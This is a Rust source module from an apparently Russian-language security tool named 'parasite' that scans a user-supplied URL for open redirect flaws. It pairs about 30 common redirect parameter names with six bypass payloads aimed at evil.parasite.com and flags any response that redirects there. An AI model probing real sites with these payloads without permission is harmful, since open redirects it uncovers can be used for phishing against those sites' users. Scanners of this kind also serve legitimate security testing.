use anyhow::Result;
use crate::ui::{self, color::*};

const REDIRECT_PARAMS: &[&str] = &[
    "url","redirect","return","returnUrl","returnTo","return_url","return_to",
    "next","goto","target","dest","destination","redir","redirect_uri","redirect_url",
    "callback","continue","forward","location","go","path","jump","ref",
    "back","backUrl","back_url","from","fromUrl","to","toUrl",
];

const PAYLOADS: &[(&str, &str)] = &[
    ("https://evil.parasite.com",   "absolute url"),
    ("//evil.parasite.com",         "protocol-relative"),
    ("/\\evil.parasite.com",        "backslash bypass"),
    ("https:evil.parasite.com",     "colon bypass"),
    ("%2F%2Fevil.parasite.com",     "double url-encoded"),
    ("https://evil.parasite.com%23","fragment bypass"),
];

pub async fn run() -> Result<()> {
    ui::section("open redirect — проверка редиректов");
    println!();

    let target = ui::prompt("target url (https://example.com/page):");
    if target.is_empty() { ui::err("url обязателен"); return Ok(()); }

    println!("  {GRAY}тестируем параметры редиректа...{RESET}");

    let client = reqwest::Client::builder()
        .user_agent("parasite/1.0")
        .timeout(std::time::Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none())
        .build()?;

    let base = target.trim_end_matches('/');
    let separator = if target.contains('?') { "&" } else { "?" };

    let mut vulns: Vec<(String, String, String)> = vec![];

    for param in REDIRECT_PARAMS {
        for (payload, desc) in PAYLOADS {
            let test_url = format!("{base}{separator}{param}={payload}");

            match client.get(&test_url).send().await {
                Ok(r) if r.status().is_redirection() => {
                    let location = r.headers()
                        .get("location")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("")
                        .to_string();

                    // Check if redirected to our payload domain
                    if location.contains("evil.parasite.com") ||
                       location.starts_with("//evil") {
                        vulns.push((
                            format!("?{param}={payload}"),
                            desc.to_string(),
                            location,
                        ));
                    }
                }
                _ => {}
            }
        }
    }

    ui::cursor_up(1);
    println!();
    println!("  {DRED}╔════════════════ {BRED}{BOLD}open redirect{RESET}{DRED} ════════════════╗{RESET}");
    println!("  {DRED}║{RESET}  {GRAY}target:{RESET}  {WHITE}{}{RESET}", shorten(base, 54));
    println!("  {DRED}║{RESET}  {GRAY}параметров:{RESET}  {WHITE}{}  {RESET}  {GRAY}пэйлоудов:{RESET}  {WHITE}{}{RESET}",
        REDIRECT_PARAMS.len(), PAYLOADS.len());
    println!("  {DRED}║{RESET}");

    if vulns.is_empty() {
        println!("  {DRED}║{RESET}  {BRED}✓{RESET}  уязвимостей open redirect не обнаружено");
    } else {
        println!("  {DRED}║{RESET}  {RED}⚠  найдено {}{RESET} уязвимостей!", vulns.len());
        println!("  {DRED}║{RESET}");
        for (param, desc, location) in &vulns {
            println!("  {DRED}║{RESET}  {RED}✗{RESET}  {WHITE}{param}");
            println!("  {DRED}║{RESET}     {GRAY}тип:{RESET}  {desc}");
            println!("  {DRED}║{RESET}     {GRAY}→{RESET}  {RED}{}{RESET}", shorten(location, 60));
            println!("  {DRED}║{RESET}");
        }
    }

    println!("  {DRED}╚══════════════════════════════════════════════════════════════╝{RESET}");
    ui::divider();
    Ok(())
}

fn shorten(s: &str, n: usize) -> String {
    if s.len() > n { format!("{}…", &s[..n-1]) } else { s.to_string() }
}
